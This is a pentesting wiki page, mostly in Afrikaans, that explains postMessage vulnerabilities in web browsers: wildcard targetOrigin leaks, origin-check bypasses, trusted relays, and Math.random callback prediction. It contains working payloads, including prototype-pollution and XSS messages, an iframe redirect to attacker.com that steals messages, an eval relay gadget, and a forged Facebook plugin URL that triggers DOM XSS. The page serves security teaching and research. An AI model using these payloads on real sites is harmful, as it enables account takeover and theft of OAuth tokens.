# PostMessage Kwesbaarhede

{{#include ../../banners/hacktricks-training.md}}

## Stuur **PostMessage**

**PostMessage** gebruik die volgende funksie om 'n boodskap te stuur:
```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```
Let wel dat **targetOrigin** 'n '\*' kan wees of 'n URL soos _https://company.com._\
In die **tweede scenario**, kan die **boodskap slegs na daardie domain gestuur word** (selfs as die origin van die Window object anders is).\
As die **wildcard** gebruik word, **boodskappe na enige domain gestuur kan word**, en sal na die origin van die Window object gestuur word.

### Aanval op iframe & wildcard in **targetOrigin**

Soos verduidelik in [**this report**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/) as jy 'n bladsy vind wat **iframed** kan word (geen `X-Frame-Header` protection nie) en wat **sensitiewe** boodskappe via **postMessage** gebruik met 'n **wildcard** (\*), kan jy die **origin** van die **iframe** wysig en die **sensitiewe** boodskap na 'n domain wat deur jou beheer word **leak**.\
Neem kennis dat as die bladsy iframed kan word maar die **targetOrigin** **op 'n URL gestel is en nie op 'n wildcard nie**, sal hierdie **truuk nie werk nie**.
```html
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
setTimeout(exp, 6000); //Wait 6s

//Try to change the origin of the iframe each 100ms
function exp(){
setInterval(function(){
window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
}, 100);
}
</script>
```
## addEventListener exploitation

**`addEventListener`** is die funksie wat deur JS gebruik word om die funksie te registreer wat **`postMessages` verwag**.\
'n kode soortgelyk aan die volgende sal gebruik word:
```javascript
window.addEventListener(
"message",
(event) => {
if (event.origin !== "http://example.org:8080") return

// ...
},
false
)
```
Note in this case how the **first thing** that the code is doing is **checking the origin**. This is terribly **important** mainly if the page is going to do **anything sensitive** with the received information (like changing a wagwoord). **If it doesn't check the origin, attackers can make slachtoffers send arbitrary data to this endpoints** and change the slachtoffers wagwoorde (in this example).

### Enumerasie

In order to **find event listeners** in the current page you can:

- **Soek** die JS-kode vir `window.addEventListener` en `$(window).on` (_JQuery version_)
- **Voer** in die developer tools console uit: `getEventListeners(window)`

![](<../../images/image (618) (1).png>)

- **Gaan na** _Elements --> Event Listeners_ in die developer tools van die browser

![](<../../images/image (396).png>)

- Gebruik 'n **browser extension** soos [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta) of [https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker). Hierdie blaaieruitbreidings sal **alle boodskappe onderskep** en dit aan jou wys.

### Origin check omseilings

- Die **`event.isTrusted`** attribuut word as veilig beskou aangesien dit net `True` teruggee vir events wat deur werklike gebruikersaksies gegenereer is. Al is dit uitdagend om te omseil as dit korrek geïmplementeer is, is sy betekenis in sekuriteitskontroles noemenswaardig.
- Die gebruik van **`indexOf()`** vir origin-validering in PostMessage-events kan vatbaar wees vir omseiling. 'n Voorbeeld wat hierdie kwesbaarheid illustreer is:

```javascript
"https://app-sj17.marketo.com".indexOf("https://app-sj17.ma")
```

- Die **`search()`** metode van `String.prototype.search()` is bedoel vir regular expressions, nie strings nie. As iets anders as 'n regexp deurgegee word lei dit tot implisiete omskakeling na regex, wat die metode potensieel onveilig maak. Dit is omdat in regex 'n dot (.) as 'n wildcard optree, wat omseiling van validering moontlik maak met spesiaal saamgestelde domeine. Byvoorbeeld:

```javascript
"https://www.safedomain.com".search("www.s.fedomain.com")
```

- Die **`match()`** funksie, soortgelyk aan `search()`, verwerk regex. As die regex verkeerd saamgestel is, kan dit vatbaar wees vir omseiling.
- Die **`escapeHtml`** funksie is bedoel om insette te sanitiseer deur karakters te escape. Dit skep egter nie 'n nuwe ge-escape objek nie maar oorskryf die eienskappe van die bestaande objek. Hierdie gedrag kan uitgebuit word. Veral as 'n objek so gemanipuleer kan word dat 'n deur jou beheerde eienskap nie `hasOwnProperty` erken nie, sal die `escapeHtml` nie soos verwag werk nie. Dit word in die voorbeelde hieronder gedemonstreer:

- Verwachte Mislukking:

```javascript
result = u({
message: "'\"<b>\\",
})
result.message // "&#39;&quot;&lt;b&gt;\"
```

- Om die escape te omseil:

```javascript
result = u(new Error("'\"<b>\\"))
result.message // "'"<b>\
```

In die konteks van hierdie kwesbaarheid is die `File` objek uiters uitbuitbaar weens sy read-only `name` eienskap. Hierdie eienskap, wanneer dit in templates gebruik word, word nie deur die `escapeHtml` funksie gesanitiseer nie, wat tot potensiële sekuriteitsrisiko's lei.

- Die `document.domain` eienskap in JavaScript kan deur 'n skrip gestel word om die domein te verkort, wat 'n meer gemaklike toepassing van die same-origin policy binne dieselfde ouer-domein toelaat.

### Origin-only trust + vertroude relais

As 'n ontvanger slegs **`event.origin`** kontroleer (bv. vertrou enige `*.trusted.com`) kan jy dikwels 'n **"relay" bladsy op daardie origin vind wat deur die aanvaller beheerde params via `postMessage` terugkaats** na 'n gespesifiseerde `targetOrigin`/`targetWindow`. Voorbeelde sluit marketing/analytics gadgets in wat query params neem en `{msg_type, access_token, ...}` na `opener`/`parent` stuur. Jy kan:

- **Maak die slagoffer-bladsy in 'n popup/iframe oop wat 'n `opener` het** sodat sy handlers registreer (baie pixels/SDKs heg net listeners aan wanneer `window.opener` bestaan).
- **Navigeer 'n ander aanvaller-venster na die relay endpoint op die vertroude origin**, en vul die boodskapvelde wat jy ingespuit wil hê (message type, tokens, nonces).
- Omdat die boodskap nou **van die vertroude origin kom**, slaag origin-only validering en kan jy bevoorregte gedrag (staatveranderinge, API-oproepe, DOM-skrywings) in die slagoffer se listener trigger.

Misbruikpatrone wat in die veld gesien is:

- Analytics SDKs (bv. pixel/fbevents-style) verbruik boodskappe soos `FACEBOOK_IWL_BOOTSTRAP`, roep dan **backend APIs aan met 'n token wat in die boodskap voorsien is** en sluit **`location.href` / `document.referrer`** in die versoekliggaam in. As jy jou eie token voorsien, kan jy **daardie versoeke in die token se versoekgeskiedenis/logs lees** en OAuth-kodes/tokens wat in die URL/referrer van die slagoffer-bladsy voorkom, eksfiltreer.
- Enige relay wat arbitrêre velde in `postMessage` weerspieël laat jou toe om **boodskapsoorte te spoofs** wat deur bevoorregte listeners verwag word. Kombineer dit met swak insetvalidering om Graph/REST-oproepe, funksie-ontsluitings, of CSRF-ekwivalente vloei te bereik.

Jagwenke: enumereer `postMessage` listeners wat slegs `event.origin` nagaan, en soek dan na **same-origin HTML/JS endpoints wat URL-params via `postMessage` deurstuur** (marketing previews, login popups, OAuth foutbladsye). Stik albei saam met `window.open()` + `postMessage` om origin-checks te omzeil.

### e.origin == window.origin bypass

When embedding a web page within a **sandboxed iframe** using %%%%%%, it's crucial to understand that the iframe's origin will be set to null. This is particularly important when dealing with **sandbox attributes** and their implications on security and functionality.

By specifying **`allow-popups`** in the sandbox attribute, any popup window opened from within the iframe inherits the sandbox restrictions of its parent. This means that unless the **`allow-popups-to-escape-sandbox`** attribute is also included, the popup window's origin is similarly set to `null`, aligning with the iframe's origin.

Consequently, when a popup is opened under these conditions and a message is sent from the iframe to the popup using **`postMessage`**, both the sending and receiving ends have their origins set to `null`. This situation leads to a scenario where **`e.origin == window.origin`** evaluates to true (`null == null`), because both the iframe and the popup share the same origin value of `null`.

For more information **read**:


{{#ref}}
bypassing-sop-with-iframes-1.md
{{#endref}}

### Bypassing e.source

Dit is moontlik om te kontroleer of die boodskap van dieselfde venster kom waarin die skrip luister (veral interessant vir **Content Scripts from browser extensions** om te kontroleer of die boodskap vanaf dieselfde bladsy gestuur is):
```javascript
// If it’s not, return immediately.
if (received_message.source !== window) {
return
}
```
Jy kan die **`e.source`** van 'n boodskap op null dwing deur 'n **iframe** te skep wat die **postMessage** stuur en onmiddellik verwyder word.

Vir meer inligting **lees:**


{{#ref}}
bypassing-sop-with-iframes-2.md
{{#endref}}

### X-Frame-Header bypass

Om hierdie aanvalle uit te voer sal dit ideaal wees as jy die **slagoffer webblad** binne 'n `iframe` kan plaas. Maar sekere headers soos `X-Frame-Header` kan daardie **gedrag** **voorkom**.\
In daardie scenario's kan jy steeds 'n minder stealthy aanval gebruik. Jy kan 'n nuwe tab na die kwesbare webtoepassing oopmaak en daarmee kommunikeer:
```html
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```
### Stealing message sent to child by blocking the main page

In die volgende bladsy kan jy sien hoe jy 'n **gevoelige postmessage data** wat na 'n **child iframe** gestuur word, kan steel deur die **main** bladsy te **blokkeer** voordat die data gestuur word en 'n **XSS in the child** te misbruik om die data te **leak** voordat dit ontvang word:


{{#ref}}
blocking-main-page-to-steal-postmessage.md
{{#endref}}

### Stealing message by modifying iframe location

Indien jy 'n webblad in 'n iframe kan laai sonder X-Frame-Header wat 'n ander iframe bevat, kan jy die **location of that child iframe** verander. As dit 'n **postmessage** ontvang wat met 'n **wildcard** gestuur is, kan 'n aanvaller daardie iframe se **origin** na 'n bladsy wat hy beheer verander en die boodskap **steel**:


{{#ref}}
steal-postmessage-modifying-iframe-location.md
{{#endref}}

### postMessage na Prototype Pollution en/of XSS

In scenario's waar die data wat via `postMessage` gestuur word deur JS uitgevoer word, kan jy die **page** in 'n `iframe` plaas en die **prototype pollution/XSS** misbruik deur die exploit via `postMessage` te stuur.

A paar **baie goed verduidelikte XSS deur `postMessage`** kan gevind word by [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)

Voorbeeld van 'n exploit om **Prototype Pollution en dan XSS** te misbruik deur 'n `postMessage` na 'n `iframe`:
```html
<html>
<body>
<iframe
id="idframe"
src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
<script>
function get_code() {
document
.getElementById("iframe_victim")
.contentWindow.postMessage(
'{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\" />"}}}',
"*"
)
document
.getElementById("iframe_victim")
.contentWindow.postMessage(JSON.stringify("refresh"), "*")
}

setTimeout(get_code, 2000)
</script>
</body>
</html>
```
Vir **meer inligting**:

- Skakel na bladsy oor [**prototype pollution**](../deserialization/nodejs-proto-prototype-pollution/index.html)
- Skakel na bladsy oor [**XSS**](../xss-cross-site-scripting/index.html)
- Skakel na bladsy oor [**client side prototype pollution to XSS**](../deserialization/nodejs-proto-prototype-pollution/index.html#client-side-prototype-pollution-to-xss)

### Trusted-origin allowlist is nie 'n grens nie

'n Streng `event.origin`-kontrole werk slegs as die **trusted origin cannot run attacker JS**. Wanneer geprivilegieerde bladsye derdeparty-iframes inbed en aanvaar dat `event.origin === "https://partner.com"` veilig is, word enige XSS in `partner.com` 'n brug na die ouer:
```javascript
// Parent (trusted page)
window.addEventListener("message", (e) => {
if (e.origin !== "https://partner.com") return
const [type, html] = e.data.split("|")
if (type === "Partner.learnMore") target.innerHTML = html // DOM XSS
})
```
Aanvalspatroon wat in die wild waargeneem is:

1. **Benut XSS in die partner iframe** en drop 'n relay gadget sodat enige `postMessage` code exec binne die betroubare origin word:
```html
<img src="" onerror="onmessage=(e)=>{eval(e.data.cmd)};">
```
2. **From the attacker page**, stuur JS na die gekompromitteerde iframe wat 'n allowed message type terug na die parent deurstuur. Die boodskap kom van `partner.com`, gaan deur die allowlist, en dra HTML wat onveilig ingevoeg word:
```javascript
postMessage({
cmd: `top.frames[1].postMessage('Partner.learnMore|<img src="" onerror="alert(document.domain)">|b|c', '*')`
}, "*")
```
3. Die parent injects die attacker HTML, wat **JS-uitvoering in die parent origin** gee (bv., `facebook.com`), wat dan gebruik kan word om OAuth-kodes te steel of te pivot na volledige account takeover flows.

Key takeaways:

- **Partner origin isn't a boundary**: enige XSS in 'n "trusted" partner laat aanvallers toe om toegelate messages te stuur wat `event.origin`-kontroles omseil.
- Handlers wat **render partner-controlled payloads** (bv., `innerHTML` op spesifieke message-tipes) maak partner compromise 'n same-origin DOM XSS.
- 'n Breë **message surface** (baie tipes, geen strukturiteitsvalidasie) bied meer gadgets vir pivoting sodra 'n partner iframe gekompromitteer is.

### Predicting **`Math.random()`** callback tokens in postMessage bridges

Wanneer message validation 'n “shared secret” gebruik wat gegenereer is met `Math.random()` (bv., `guid() { return "f" + (Math.random() * (1<<30)).toString(16).replace(".", "") }`) en dieselfde helper noem ook plugin iframes, kan jy PRNG-uitsette herstel en vertroude messages vervals:

- **Leak PRNG outputs via `window.name`:** The SDK auto-names plugin iframes with `guid()`. If you control the top frame, iframe the victim page, then navigate the plugin iframe to your origin (e.g., `window.frames[0].frames[0].location='https://attacker.com'`) and read `window.frames[0].frames[0].name` to obtain a raw `Math.random()` output.
- **Force more outputs without reloads:** Sommige SDKs openbaar 'n reinit-pad; in die FB SDK dwing die stuur van `init:post` met `{xfbml:1}` `XFBML.parse()`, vernietig/maak die plugin iframe weer, en genereer nuwe name/callback IDs. Herhaalde reinit produseer soveel PRNG-uitsette as benodig (let op ekstra interne `Math.random()`-oproepe vir callback/iframe IDs, so oplossers moet tussenliggende waardes oorslaan).
- **Trusted-origin delivery via parameter pollution:** As 'n first-party plugin endpoint 'n onsanitized parameter in die cross-window payload reflekteer (bv., `/plugins/feedback.php?...%23relation=parent.parent.frames[0]%26cb=PAYLOAD%26origin=TARGET`), kan jy `&type=...&iconSVG=...` injekteer terwyl die vertroude `facebook.com` origin behou word.
- **Predict the next callback:** Skakel gelekte iframe-name terug na floats in `[0,1)` en voer verskeie waardes (selfs nie-opeenvolgende) in 'n V8 `Math.random` predictor (bv., Z3-gebaseerd). Genereer die volgende `guid()` lokaal om die verwagte callback-token te vervals.
- **Trigger the sink:** Stel die postMessage-data so op dat die bridge `xd.mpn.setupIconIframe` dispatch en HTML in `iconSVG` inject (bv., URL-geënkodeerde `<img src=x onerror=...>`), wat DOM XSS binne die hosting origin bereik; van daar kan same-origin iframes (OAuth dialogs, arbiters, ens.) gelees word.
- **Framing quirks help:** Die ketting vereis framing. In sommige mobile webviews kan `X-Frame-Options` degradeer na unsupported `ALLOW-FROM` wanneer `frame-ancestors` teenwoordig is, en “compat” parameters kan permissiewe `frame-ancestors` afdwing, wat die `window.name` side channel moontlik maak.

#### Minimale vervalste boodskap voorbeeld
```javascript
// predictedFloat is the solver output for the next Math.random()
const callback = "f" + (predictedFloat * (1 << 30)).toString(16).replace(".", "")
const payload =
callback +
"&type=mpn.setupIconIframe&frameName=x" +
"&iconSVG=%3cimg%20src%3dx%20onerror%3dalert(document.domain)%3e"
const fbMsg = `https://www.facebook.com/plugins/feedback.php?api_key&channel_url=https://staticxx.facebook.com/x/connect/xd_arbiter/?version=42%23relation=parent.parent.frames[0]%26cb=${encodeURIComponent(payload)}%26origin=https://www.facebook.com`
iframe.location = fbMsg // sends postMessage from facebook.com with forged callback
```
## Verwysings

- [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)
- [https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
- [Leaking fbevents: OAuth code exfiltration via postMessage trust leading to Instagram ATO](https://ysamm.com/uncategorized/2026/01/16/leaking-fbevents-ato.html)
- Om te oefen: [https://github.com/yavolo/eventlistener-xss-recon](https://github.com/yavolo/eventlistener-xss-recon)
- [Self XSS Facebook Payments](https://ysamm.com/uncategorized/2026/01/15/self-xss-facebook-payments.html)
- [Facebook JavaScript SDK Math.random callback prediction → DOM XSS writeup](https://ysamm.com/uncategorized/2026/01/17/math-random-facebook-sdk.html)
- [V8 Math.random() state recovery (Z3 predictor)](https://github.com/PwnFunction/v8-randomness-predictor)

{{#include ../../banners/hacktricks-training.md}}
